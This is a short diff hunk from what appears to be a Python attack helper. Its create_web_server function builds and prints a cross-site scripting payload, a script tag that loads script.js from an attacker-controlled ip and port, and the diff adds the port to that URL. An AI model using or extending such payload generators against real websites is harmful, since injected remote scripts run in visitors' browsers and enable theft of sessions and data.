@@ -34,7 +34,7 @@ Steps:
 
 def create_web_server(ip,port):
     # Echo the payload instead of saving it to a file
-    payload = f'<script src="http://{ip}/script.js"></script>'
+    payload = f'<script src="http://{ip}:{port}/script.js"></script>'
     print(f"Payload: {payload}")
 
     # Create the 'web-server' directory
